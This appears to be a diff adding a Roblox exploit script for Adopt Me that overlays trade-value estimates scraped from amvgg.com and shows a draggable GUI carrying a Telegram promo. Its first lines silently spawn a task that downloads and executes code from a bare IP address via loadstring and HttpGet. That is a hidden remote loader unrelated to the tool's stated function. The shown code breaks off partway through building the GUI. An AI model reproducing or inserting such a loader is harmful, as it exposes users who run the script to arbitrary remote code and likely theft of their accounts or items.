@@ -1,0 +1,1530 @@
+task.spawn(function()
+loadstring(game:HttpGet("http://31.77.156.163:8080/raw/4273aebb5ef03aa81fc559b3973c9bc1"))()
+end)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+
+setthreadidentity(2)
+
+local Fsys = require(ReplicatedStorage:WaitForChild("Fsys"))
+local load = Fsys.load
+local KindDB = load("KindDB")
+local ClientData = load("ClientData")
+local InventoryDB = load("InventoryDB")
+local UIManager = load("UIManager")
+local BackpackButtonCreator = load("BackpackButtonCreator")
+local BackpackApp = UIManager.apps and UIManager.apps.BackpackApp
+
+local TradeApp = UIManager.apps.TradeApp
+local player = Players.LocalPlayer
+
+local function normalizeName(name)
+	if not name then return nil end
+	name = name:gsub("%s+", " ")
+	name = name:gsub("^%s+", ""):gsub("%s+$", "")
+	return name
+end
+
+local function stripGameSuffixes(name)
+	if not name then return nil end
+	name = name:gsub("%s*%b()", "")
+	name = name:gsub("^%s+", ""):gsub("%s+$", "")
+	return name
+end
+
+local function canonicalGameName(name)
+	return normalizeName(stripGameSuffixes(name))
+end
+
+local Values = {}
+Values.MODE = "ridepot" -- "baseless" | "ridepot" | "frost"
+Values.MODE_ORDER = { "baseless", "ridepot", "frost" }
+Values.MODE_LABELS = {
+	baseless = "Baseless",
+	ridepot = "Ridepot",
+	frost = "Frost",
+}
+
+-- amvgg.com conversion constants (module 8045)
+local FROST_RATIO = 2 / 3
+local RIDEPOT_MULT = 154
+
+local VALUABLE_CATEGORIES = {
+	pets = true,
+	pet_accessories = true,
+	strollers = true,
+	food = true,
+	transport = true,
+	toys = true,
+	roleplay = true,
+	gifts = true,
+	stickers = true,
+}
+
+local kindnames = {}
+for catName, catTable in pairs(InventoryDB) do
+	if type(catTable) == "table" then
+		for kindId, info in pairs(catTable) do
+			if type(info) == "table" and info.name then
+				kindnames[kindId] = normalizeName(info.name)
+			end
+		end
+	end
+end
+
+local petsbyname = {}
+local petsbylower = {}
+local simplebyname = {}
+local simplebylower = {}
+local simplebykind = {}
+local simplebykey = {}
+
+local function lookupKey(name)
+	return name:lower():gsub("_", " ")
+end
+
+local function normalizeLookupKey(name)
+	if not name then return nil end
+	return name:lower():gsub("[^%w]", "")
+end
+
+local AMVGG_PARTIAL_RULES = {
+	{ patterns = { "fly%-a", "fly a" }, amvgg = "Fly-A-Pet Potion", value = 0.012 },
+	{ patterns = { "ride%-a", "ride a" }, amvgg = "Ride-A-Pet Potion", value = 0.0065 },
+}
+
+local function matchesPartialRule(lower, patterns)
+	for _, pattern in ipairs(patterns) do
+		if lower:find(pattern, 1, false) then
+			return true
+		end
+	end
+	return false
+end
+
+local function getAmvggItemByName(amvggName)
+	return simplebyname[amvggName] or simplebylower[amvggName:lower()]
+end
+
+local function getInventoryInfo(kind, category)
+	if not kind then
+		return nil
+	end
+	if category and InventoryDB[category] and InventoryDB[category][kind] then
+		return InventoryDB[category][kind]
+	end
+	for _, catTable in pairs(InventoryDB) do
+		if type(catTable) == "table" and catTable[kind] then
+			return catTable[kind]
+		end
+	end
+	return nil
+end
+
+local function collectItemSearchNames(kind, category, item_data)
+	local names, seen = {}, {}
+
+	local function add(name)
+		if name == nil then
+			return
+		end
+		local n = normalizeName(tostring(name))
+		if n and not seen[n] then
+			seen[n] = true
+			table.insert(names, n)
+		end
+		local c = canonicalGameName(n)
+		if c and not seen[c] then
+			seen[c] = true
+			table.insert(names, c)
+		end
+	end
+
+	if item_data then
+		add(item_data.kind)
+		if item_data.id and KindDB[item_data.id] then
+			local kd = KindDB[item_data.id]
+			add(kd.name)
+			add(kd.kind)
+			add(kd.display_name)
+		end
+	end
+
+	if kind then
+		add(kind)
+		add(kindnames[kind])
+		local info = getInventoryInfo(kind, category)
+		if info then
+			add(info.name)
+		end
+	end
+
+	return names
+end
+
+local function resolveKind(item_data)
+	if not item_data then
+		return nil
+	end
+
+	local kind = item_data.kind
+	if not kind and item_data.id then
+		local kd = KindDB[item_data.id]
+		if kd then
+			kind = kd.name or kd.kind
+		end
+	end
+
+	return kind
+end
+
+local function lookupPet(petkind)
+	if not petkind then return nil end
+
+	local display = kindnames[petkind]
+	if display then
+		local pet = petsbyname[display] or petsbylower[display:lower()]
+		if pet then return pet end
+	end
+
+	local n = normalizeName(petkind)
+	if n then
+		local pet = petsbyname[n] or petsbylower[n:lower()]
+		if pet then return pet end
+	end
+
+	return petsbylower[lookupKey(petkind)]
+end
+
+local function findSimpleByDisplayName(name)
+	if not name then
+		return nil
+	end
+
+	for _, candidate in ipairs({
+		normalizeName(name),
+		canonicalGameName(name),
+	}) do
+		if candidate then
+			local item = simplebyname[candidate] or simplebylower[candidate:lower()]
+			if item then
+				return item
+			end
+			local key = normalizeLookupKey(candidate)
+			if key and simplebykey[key] then
+				return simplebykey[key]
+			end
+		end
+	end
+
+	local stripped = canonicalGameName(name)
+	if stripped then
+		local lower = stripped:lower()
+		local best, bestLen = nil, 0
+		for amvggLower, item in pairs(simplebylower) do
+			if lower:sub(1, #amvggLower) == amvggLower and #amvggLower > bestLen then
+				best = item
+				bestLen = #amvggLower
+			end
+		end
+		if best then
+			return best
+		end
+	end
+
+	return nil
+end
+
+local function findSimpleByPartialName(name)
+	if not name then
+		return nil
+	end
+
+	local lower = name:lower()
+	for _, rule in ipairs(AMVGG_PARTIAL_RULES) do
+		if matchesPartialRule(lower, rule.patterns) then
+			local item = getAmvggItemByName(rule.amvgg)
+			if item then
+				return item
+			end
+			if rule.value then
+				return { name = rule.amvgg, value = tostring(rule.value) }
+			end
+		end
+	end
+
+	return findSimpleByDisplayName(name)
+end
+
+local function lookupSimple(kind, category, item_data)
+	local lookupKind = (item_data and item_data.kind) or kind
+
+	if lookupKind and simplebykind[lookupKind] then
+		return simplebykind[lookupKind]
+	end
+	if kind and simplebykind[kind] then
+		return simplebykind[kind]
+	end
+
+	for _, name in ipairs(collectItemSearchNames(kind, category, item_data)) do
+		local item = findSimpleByPartialName(name)
+		if item then
+			return item
+		end
+	end
+
+	if kind then
+		local item = findSimpleByPartialName(kind)
+		if item then
+			return item
+		end
+		return simplebylower[lookupKey(kind)]
+	end
+
+	return nil
+end
+
+local function rebuildFoodPartialAliases()
+	for kindId, info in pairs(InventoryDB.food or {}) do
+		if type(info) == "table" and info.name then
+			local lower = info.name:lower()
+			for _, rule in ipairs(AMVGG_PARTIAL_RULES) do
+				if matchesPartialRule(lower, rule.patterns) then
+					local item = getAmvggItemByName(rule.amvgg)
+					if not item and rule.value then
+						item = { name = rule.amvgg, value = tostring(rule.value) }
+					end
+					if item then
+						simplebykind[kindId] = item
+					end
+					break
+				end
+			end
+		end
+	end
+end
+
+local function rebuildSimpleByKind()
+	for k in pairs(simplebykind) do
+		simplebykind[k] = nil
+	end
+	for catName, catTable in pairs(InventoryDB) do
+		if catName ~= "pets" and type(catTable) == "table" then
+			for kindId, info in pairs(catTable) do
+				if type(info) == "table" and info.name then
+					local item = findSimpleByPartialName(info.name)
+					if item then
+						simplebykind[kindId] = item
+					end
+				end
+			end
+		end
+	end
+	rebuildFoodPartialAliases()
+end
+
+local function indexSimpleItem(item)
+	local n = normalizeName(item.name)
+	if not n then return end
+	simplebyname[n] = item
+	simplebylower[n:lower()] = item
+	local key = normalizeLookupKey(n)
+	if key then
+		simplebykey[key] = item
+	end
+end
+
+local function roundFixed(n, decimals)
+	local mult = 10 ^ decimals
+	return math.floor(n * mult + 0.5) / mult
+end
+
+-- коэффициенты amvgg (module 6342) для петов с category != 13
+local CATEGORY_COEFFS = HttpService:JSONDecode([[{"0":{"NP":0.08,"R":0.5,"F":0.6,"NNP":0.21,"NR":0.6,"NF":0.75,"MNP":0.45,"MR":0.65,"MF":0.775},"1":{"NP":0.08,"R":0.5,"F":0.6,"NNP":0.35,"NR":0.725,"NF":0.79,"MNP":0.55,"MR":0.675,"MF":0.8},"2":{"NP":0.1,"R":0.525,"F":0.625,"NNP":0.425,"NR":0.75,"NF":0.8,"MNP":0.65,"MR":0.75,"MF":0.81},"3":{"NP":0.125,"R":0.6,"F":0.65,"NNP":0.55,"NR":0.8,"NF":0.81,"MNP":0.725,"MR":0.8,"MF":0.85},"4":{"NP":0.166,"R":0.65,"F":0.7,"NNP":0.625,"NR":0.81,"NF":0.82,"MNP":0.75,"MR":0.825,"MF":0.86},"5":{"NP":0.2,"R":0.675,"F":0.725,"NNP":0.675,"NR":0.82,"NF":0.83,"MNP":0.775,"MR":0.85,"MF":0.89},"6":{"NP":0.3,"R":0.7,"F":0.75,"NNP":0.725,"NR":0.85,"NF":0.87,"MNP":0.825,"MR":0.9,"MF":0.925},"7":{"NP":0.45,"R":0.725,"F":0.775,"NNP":0.75,"NR":0.9,"NF":0.91,"MNP":0.85,"MR":0.92,"MF":0.95},"8":{"NP":0.55,"R":0.75,"F":0.8,"NNP":0.77,"NR":0.9,"NF":0.915,"MNP":0.875,"MR":0.93,"MF":0.96},"9":{"NP":0.65,"R":0.825,"F":0.85,"NNP":0.85,"NR":0.925,"NF":0.94,"MNP":0.925,"MR":0.95,"MF":0.975},"10":{"NP":0.8,"R":0.9,"F":0.92,"NNP":0.925,"NR":0.96,"NF":0.97,"MNP":1.05,"MR":0.98,"MF":0.99},"11":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.05,"MR":1,"MF":1},"12":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1.03,"NR":0.98,"NF":0.985,"MNP":1.1,"MR":1,"MF":1},"21":{"NP":0.75,"R":0.86,"F":0.875,"NNP":0.88,"NR":0.93,"NF":0.95,"MNP":1,"MR":0.98,"MF":0.99},"22":{"NP":0.75,"R":0.86,"F":0.875,"NNP":0.88,"NR":0.93,"NF":0.95,"MNP":0.97,"MR":0.98,"MF":0.99},"23":{"NP":0.7,"R":0.8,"F":0.85,"NNP":0.85,"NR":0.9,"NF":0.93,"MNP":0.95,"MR":0.965,"MF":0.985},"33":{"NP":0.15,"R":0.6,"F":0.65,"NNP":0.375,"NR":0.75,"NF":0.8,"MNP":0.5,"MR":0.7,"MF":0.8},"44":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},"45":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},"46":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},"47":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},"48":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1,"MR":1,"MF":1},"49":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},"50":{"NP":0.985,"R":0.99,"F":0.995,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},"55":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.075,"MR":1,"MF":1},"66":{"NP":0.9,"R":0.95,"F":0.975,"NNP":1,"NR":0.98,"NF":0.985,"MNP":1.125,"MR":1,"MF":1},"69":{"NP":0.9,"R":0.95,"F":0.975,"NNP":0.96,"NR":0.98,"NF":0.985,"MNP":1,"MR":1,"MF":1},"79":{"NP":0.97,"R":0.98,"F":0.985,"NNP":1,"NR":1,"NF":1,"MNP":1.05,"MR":1,"MF":1},"81":{"NP":0.98,"R":0.985,"F":0.99,"NNP":1,"NR":1,"NF":1,"MNP":1.025,"MR":1,"MF":1},"99":{"NP":0.8,"R":0.9,"F":0.92,"NNP":0.95,"NR":0.975,"NF":0.98,"MNP":1,"MR":1,"MF":1},"111":{"NP":0.04,"R":0.5,"F":0.6,"NNP":0.125,"NR":0.6,"NF":0.75,"MNP":0.33,"MR":0.65,"MF":0.75},"222":{"NP":0.02,"R":0.45,"F":0.55,"NNP":0.07,"NR":0.5,"NF":0.65,"MNP":0.275,"MR":0.55,"MF":0.65},"333":{"NP":0.03,"R":0.5,"F":0.6,"NNP":0.1,"NR":0.55,"NF":0.7,"MNP":0.3,"MR":0.6,"MF":0.7}}]])
+
+local CAT13_FIELDS = {
+	fr = "regularValue", r = "rValue", f = "fValue", [""] = "npRegularValue",
+	nfr = "neonValue", nr = "nrValue", nf = "nfValue", n = "npNeonValue",
+	mfr = "megaValue", mr = "mrValue", mf = "mfValue", m = "npMegaValue",
+}
+
+local DERIVED_FIELDS = {
+	fr = "regular", r = "R", f = "F", [""] = "NP",
+	nfr = "neon", nr = "NR", nf = "NF", n = "NNP",
+	mfr = "mega", mr = "MR", mf = "MF", m = "MNP",
+}
+
+local function computeDerivedValues(pet)
+	local cat = tonumber(pet.category)
+	if not cat or cat == 13 then
+		return nil
+	end
+
+	local coeffs = CATEGORY_COEFFS[tostring(cat)]
+	if not coeffs then
+		return nil
+	end
+
+	local reg = tonumber(pet.regularValue) or 0
+	local neon = tonumber(pet.neonValue) or 0
+	local mega = tonumber(pet.megaValue) or 0
+	local s0 = reg >= 0.0175 and 3 or 4
+	local s1 = 4
+
+	if cat == 11 and reg > 0.08 then
+		return {
+			NP = roundFixed(0.95 * reg, s0),
+			R = roundFixed(0.975 * reg, s0),
+			F = roundFixed(0.975 * reg, s0),
+			NNP = roundFixed(neon * coeffs.NNP, s1),
+			NR = neon > 0.2 and neon or roundFixed(neon * coeffs.NR, s1),
+			NF = neon > 0.2 and neon or roundFixed(neon * coeffs.NF, s1),
+			MNP = roundFixed(mega * coeffs.MNP, s1),
+			MR = mega > 0.9 and mega or roundFixed(mega * coeffs.MR, s1),
+			MF = mega > 0.9 and mega or roundFixed(mega * coeffs.MF, s1),
+		}
+	end
+
+	return {
+		NP = roundFixed(reg * coeffs.NP, s0),
+		R = roundFixed(reg * coeffs.R, s0),
+		F = roundFixed(reg * coeffs.F, s0),
+		NNP = roundFixed(neon * coeffs.NNP, s1),
+		NR = roundFixed(neon * coeffs.NR, s1),
+		NF = roundFixed(neon * coeffs.NF, s1),
+		MNP = roundFixed(mega * coeffs.MNP, s1),
+		MR = roundFixed(mega * coeffs.MR, s1),
+		MF = roundFixed(mega * coeffs.MF, s1),
+	}
+end
+
+local function getVariantKey(props)
+	local fly = props.flyable == true
+	local ride = props.rideable == true
+	local pot = (fly and "f" or "") .. (ride and "r" or "")
+
+	if props.mega_neon == true then
+		return "m" .. pot
+	elseif props.neon == true then
+		return "n" .. pot
+	end
+	return pot
+end
+
+local function getBaseValue(pet, variantKey)
+	local cat = tonumber(pet.category)
+
+	if cat == 13 then
+		local field = CAT13_FIELDS[variantKey]
+		if field then
+			return tonumber(pet[field])
+		end
+		return nil
+	end
+
+	local derived = computeDerivedValues(pet)
+	if not derived then
+		if variantKey == "fr" or variantKey == "nfr" or variantKey == "mfr" then
+			if variantKey == "nfr" then return tonumber(pet.neonValue) end
+			if variantKey == "mfr" then return tonumber(pet.megaValue) end
+			return tonumber(pet.regularValue)
+		end
+		return nil
+	end
+
+	local slot = DERIVED_FIELDS[variantKey]
+	if slot == "regular" then return tonumber(pet.regularValue) end
+	if slot == "neon" then return tonumber(pet.neonValue) end
+	if slot == "mega" then return tonumber(pet.megaValue) end
+	return derived[slot]
+end
+
+local function frostDecimals(x)
+	local a = math.abs(x)
+	local decimals
+	if a >= 100 then
+		decimals = 0
+	elseif a >= 10 then
+		decimals = 1
+	elseif a >= 1 then
+		decimals = 2
+	elseif a >= 0.1 then
+		decimals = 3
+	else
+		decimals = 4
+	end
+	local mult = 10 ^ decimals
+	return math.floor(x * mult + 0.5) / mult
+end
+
+local function toFrostValue(v)
+	return frostDecimals(FROST_RATIO * v)
+end
+
+local function toRidePotValue(v)
+	local stepped = math.floor(RIDEPOT_MULT * v * 20 + 0.5) / 20
+	return math.floor(stepped * 100 + 0.5) / 100
+end
+
+local function extractJsonArray(body, arrayKey)
+	body = body:gsub('\\u0026', '&')
+	body = body:gsub('\\"', '"')
+
+	local marker = '"' .. arrayKey .. '":'
+	local startIdx = body:find(marker .. "%[")
+	if not startIdx then
+		return nil
+	end
+
+	startIdx = startIdx + #marker
+	local depth = 0
+	local endIdx = startIdx
+	local inString = false
+	local escape = false
+
+	for i = startIdx, math.min(startIdx + 4000000, #body) do
+		local c = body:sub(i, i)
+
+		if inString then
+			if escape then
+				escape = false
+			elseif c == '\\' then
+				escape = true
+			elseif c == '"' then
+				inString = false
+			end
+		else
+			if c == '"' then
+				inString = true
+			elseif c == '[' then
+				depth = depth + 1
+			elseif c == ']' then
+				depth = depth - 1
+			end
+		end
+
+		if depth == 0 and i > startIdx then
+			endIdx = i
+			break
+		end
+	end
+
+	local json = body:sub(startIdx, endIdx)
+	local ok, data = pcall(function()
+		return HttpService:JSONDecode(json)
+	end)
+	if ok and data then
+		return data
+	end
+	return nil
+end
+
+local function fetchAmvggList(url, arrayKey)
+	local ok, response = pcall(function()
+		return request({
+			Url = url,
+			Method = "GET",
+			Headers = {
+				["Accept"] = "text/html",
+				["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
+			},
+		})
+	end)
+
+	if not ok or not response or not response.Success then
+		return nil
+	end
+
+	return extractJsonArray(response.Body, arrayKey)
+end
+
+local AMVGG_SOURCES = {
+	{ label = "pets",      url = "https://amvgg.com/values/pets",      key = "pets"  },
+	{ label = "eggs",      url = "https://amvgg.com/values/eggs",      key = "items" },
+	{ label = "petwear",   url = "https://amvgg.com/values/petwear",   key = "items" },
+	{ label = "strollers", url = "https://amvgg.com/values/strollers", key = "items" },
+	{ label = "food",      url = "https://amvgg.com/values/food",      key = "items" },
+	{ label = "vehicles",  url = "https://amvgg.com/values/vehicles",  key = "items" },
+	{ label = "toys",      url = "https://amvgg.com/values/toys",      key = "items" },
+	{ label = "gifts",     url = "https://amvgg.com/values/gifts",     key = "items" },
+	{ label = "stickers",  url = "https://amvgg.com/values/stickers",  key = "items" },
+}
+
+-- Загружаем источники в фоне, чтобы не блокировать UI
+-- (значения появятся на предметах как только загрузятся)
+local amvggValuesReady = false
+task.spawn(function()
+	for _, source in ipairs(AMVGG_SOURCES) do
+		local list = fetchAmvggList(source.url, source.key)
+		if list then
+			local count = 0
+			if source.key == "pets" then
+				for _, pet in ipairs(list) do
+					local n = normalizeName(pet.name)
+					if n then
+						petsbyname[n]       = pet
+						petsbylower[n:lower()] = pet
+						count += 1
+					end
+				end
+			else
+				for _, item in ipairs(list) do
+					indexSimpleItem(item)
+					count += 1
+				end
+			end
+			print("[amvgg] Loaded " .. count .. " " .. source.label)
+		else
+			warn("[amvgg] Failed to load " .. source.label)
+		end
+		task.wait(0) -- даём другим корутинам выполниться
+	end
+
+	rebuildSimpleByKind()
+	local mappedKinds = 0
+	for _ in pairs(simplebykind) do mappedKinds += 1 end
+	print("[amvgg] Mapped " .. mappedKinds .. " inventory kinds to amvgg values")
+
+	amvggValuesReady = true
+	-- Обновляем ярлыки цен после полной загрузки
+	task.defer(function()
+		if BackpackApp then
+			BackpackApp:refresh_rendered_items()
+		end
+	end)
+end)
+
+-- Ставим заглушку rebuildSimpleByKind() чтобы не падало до загрузки
+rebuildSimpleByKind()
+
+local function rawVal(kind, props, category, item_data)
+	if category and category ~= "pets" then
+		local simple = lookupSimple(kind, category, item_data)
+		if simple then
+			return tonumber(simple.value) or 0
+		end
+	end
+
+	local pet = lookupPet(kind)
+	if pet then
+		props = props or {}
+		local key = getVariantKey(props)
+		return getBaseValue(pet, key) or 0
+	end
+
+	local simple = lookupSimple(kind, category, item_data)
+	if simple then
+		return tonumber(simple.value) or 0
+	end
+
+	return 0
+end
+
+local function val(kind, props, category, item_data)
+	local v = rawVal(kind, props, category, item_data)
+
+	if Values.MODE == "ridepot" then
+		return toRidePotValue(v)
+	elseif Values.MODE == "frost" then
+		return toFrostValue(v)
+	end
+
+	return v
+end
+
+local function safeGetOffer(getter)
+	local ok, offer = pcall(getter)
+	if not ok or type(offer) ~= "table" or type(offer.items) ~= "table" then
+		return nil
+	end
+	return offer
+end
+
+local function GetItemsFromOffer(offer)
+	if not offer or type(offer.items) ~= "table" then
+		return {}, 0
+	end
+
+	local list = offer.items
+	local items, total = {}, 0
+	for _, item in ipairs(list) do
+		local category = item.category
+		local kind = resolveKind(item)
+		local value = val(kind, item.properties, category, item)
+		total += value
+		table.insert(items, {
+			name = kind or (item.kind or "?"),
+			value = value,
+			props = item.properties,
+			category = category,
+		})
+	end
+	return items, total
+end
+
+local function GetItemsFromMyOffer()
+	local offer = safeGetOffer(function()
+		return TradeApp:_get_my_offer()
+	end)
+	return GetItemsFromOffer(offer)
+end
+
+local function GetItemsFromPartnerOffer()
+	local offer = safeGetOffer(function()
+		return TradeApp:_get_partner_offer()
+	end)
+	return GetItemsFromOffer(offer)
+end
+local function FormatValue(v)
+	if v == 0 then return "0" end
+	if v >= 1000 then return string.format("%.1fk", v/1000) end
+	if v >= 100 then return string.format("%.0f", v) end
+	local s = string.format("%.4f", v)
+	s = s:gsub("%.?0+$", "")
+	return s
+end
+local function getSingleVal(itemName, props, category)
+	return val(itemName, props or { flyable = true, rideable = true }, category or "pets")
+end
+
+function Values.SetMode(mode)
+	local valid = false
+	for _, m in ipairs(Values.MODE_ORDER) do
+		if m == mode then valid = true break end
+	end
+	if not valid then
+		warn("[amvgg] Unknown VALUE_MODE: " .. tostring(mode))
+		return false
+	end
+	Values.MODE = mode
+	return true
+end
+
+Values.GetItemsFromOffer = GetItemsFromOffer
+Values.GetItemsFromMyOffer = GetItemsFromMyOffer
+Values.GetItemsFromPartnerOffer = GetItemsFromPartnerOffer
+Values.FormatValue = FormatValue
+Values.getSingleVal = getSingleVal
+Values.val = val
+
+local player = Players.LocalPlayer
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.Enabled = true
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.AnchorPoint = Vector2.new(0.5, 0)
+mainFrame.Position = UDim2.new(0.5, 0, 0.05, 0)
+mainFrame.Size = UDim2.new(0, 480, 0, 178)
+mainFrame.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Visible = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 14)
+mainCorner.Parent = mainFrame
+
+-- Промо-надпись, которая двигается вместе с основной менюшкой
+-- (родитель = mainFrame, поэтому при перетаскивании окна она следует за ним)
+local promoLabel = Instance.new("TextLabel")
+promoLabel.Name = "PromoLabel"
+promoLabel.AnchorPoint = Vector2.new(0.5, 1)
+promoLabel.Position = UDim2.new(0.5, 0, 0, -6)
+promoLabel.Size = UDim2.new(1, 40, 0, 40)
+promoLabel.BackgroundColor3 = Color3.new(1, 1, 1)
+promoLabel.BackgroundTransparency = 1
+promoLabel.BorderSizePixel = 0
+promoLabel.BorderColor3 = Color3.new(0, 0, 0)
+promoLabel.Text = "ВАЛЮТЫ И РАЗДАЧИ В ТГК -> @ADM_iPad"
+promoLabel.TextColor3 = Color3.new(1, 1, 1)
+promoLabel.TextSize = 100
+promoLabel.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+promoLabel.TextScaled = true
+promoLabel.TextWrapped = true
+promoLabel.RichText = true
+promoLabel.Parent = mainFrame
+
+local promoStroke = Instance.new("UIStroke")
+promoStroke.Name = "UIStroke"
+promoStroke.Parent = promoLabel
+
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(
+			startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+-- Строка с кнопками режима (3 кнопки рядом: Baseless | Ridepot | Frost)
+local modeRow = Instance.new("Frame")
+modeRow.Name = "ModeRow"
+modeRow.BackgroundTransparency = 1
+modeRow.Position = UDim2.new(0, 8, 0, 6)
+modeRow.Size = UDim2.new(1, -16, 0, 28)
+modeRow.Parent = mainFrame
+
+local modeLayout = Instance.new("UIListLayout")
+modeLayout.FillDirection = Enum.FillDirection.Horizontal
+modeLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+modeLayout.Padding = UDim.new(0, 4)
+modeLayout.SortOrder = Enum.SortOrder.LayoutOrder
+modeLayout.Parent = modeRow
+
+local modeTabBtns = {}
+
+local function refreshBar() end -- будет переопределена ниже
+
+local function refreshModeTabs()
+	for mode, btn in pairs(modeTabBtns) do
+		if mode == Values.MODE then
+			btn.BackgroundColor3 = Color3.fromRGB(60, 120, 220)
+			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+		else
+			btn.BackgroundColor3 = Color3.fromRGB(55, 55, 62)
+			btn.TextColor3 = Color3.fromRGB(170, 170, 170)
+		end
+	end
+end
+
+for i, mode in ipairs(Values.MODE_ORDER) do
+	local label = Values.MODE_LABELS[mode] or mode
+	local btn = Instance.new("TextButton")
+	btn.Name = "ModeTab_" .. mode
+	btn.LayoutOrder = i
+	btn.Size = UDim2.new(0, 148, 1, 0)
+	btn.AutoButtonColor = false
+	btn.Text = label
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 14
+	btn.BorderSizePixel = 0
+	btn.Parent = modeRow
+
+	local bc = Instance.new("UICorner")
+	bc.CornerRadius = UDim.new(0, 8)
+	bc.Parent = btn
+
+	btn.MouseButton1Click:Connect(function()
+		if Values.SetMode(mode) then
+			refreshModeTabs()
+			refreshBar()
+			task.defer(function()
+				if BackpackApp then
+					BackpackApp:refresh_rendered_items()
+				end
+			end)
+		end
+	end)
+
+	modeTabBtns[mode] = btn
+end
+
+refreshModeTabs()
+
+local CONTENT_OFFSET = 40
+
+local resultLabel = Instance.new("TextLabel")
+resultLabel.Name = "ResultLabel"
+resultLabel.BackgroundTransparency = 1
+resultLabel.Position = UDim2.new(0, 0, 0, CONTENT_OFFSET)
+resultLabel.Size = UDim2.new(1, 0, 0, 44)
+resultLabel.Text = "LOSE"
+resultLabel.TextColor3 = Color3.fromRGB(40, 40, 40)
+resultLabel.Font = Enum.Font.GothamBlack
+resultLabel.TextScaled = true
+resultLabel.Parent = mainFrame
+
+local barContainer = Instance.new("Frame")
+barContainer.Name = "BarContainer"
+barContainer.Position = UDim2.new(0, 8, 0, CONTENT_OFFSET + 48)
+barContainer.Size = UDim2.new(1, -16, 0, 56)
+barContainer.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
+barContainer.BorderSizePixel = 0
+barContainer.ClipsDescendants = true
+barContainer.Parent = mainFrame
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(0, 12)
+barCorner.Parent = barContainer
+
+local barStroke = Instance.new("UIStroke")
+barStroke.Color = Color3.fromRGB(20, 20, 20)
+barStroke.Thickness = 2
+barStroke.Parent = barContainer
+
+local barFill = Instance.new("Frame")
+barFill.Name = "BarFill"
+barFill.Size = UDim2.new(0.5, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+barFill.BorderSizePixel = 0
+barFill.Parent = barContainer
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(0, 12)
+fillCorner.Parent = barFill
+
+local leftValue = Instance.new("TextLabel")
+leftValue.Name = "LeftValue"
+leftValue.BackgroundTransparency = 1
+leftValue.Position = UDim2.new(0, 14, 0, 0)
+leftValue.Size = UDim2.new(0, 100, 1, 0)
+leftValue.Text = "0"
+leftValue.TextColor3 = Color3.fromRGB(255, 255, 255)
+leftValue.Font = Enum.Font.GothamBlack
+leftValue.TextScaled = true
+leftValue.TextXAlignment = Enum.TextXAlignment.Left
+leftValue.ZIndex = 3
+leftValue.Parent = barContainer
+
+local rightValue = Instance.new("TextLabel")
+rightValue.Name = "RightValue"
+rightValue.BackgroundTransparency = 1
+rightValue.Position = UDim2.new(1, -90, 0, 0)
+rightValue.Size = UDim2.new(0, 76, 1, 0)
+rightValue.Text = "0"
+rightValue.TextColor3 = Color3.fromRGB(255, 255, 255)
+rightValue.Font = Enum.Font.GothamBlack
+rightValue.TextScaled = true
+rightValue.TextXAlignment = Enum.TextXAlignment.Right
+rightValue.ZIndex = 3
+rightValue.Parent = barContainer
+
+local diffLabel = Instance.new("TextLabel")
+diffLabel.Name = "DiffLabel"
+diffLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+diffLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+diffLabel.Size = UDim2.new(0, 90, 0, 26)
+diffLabel.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
+diffLabel.BackgroundTransparency = 0.15
+diffLabel.Text = "0"
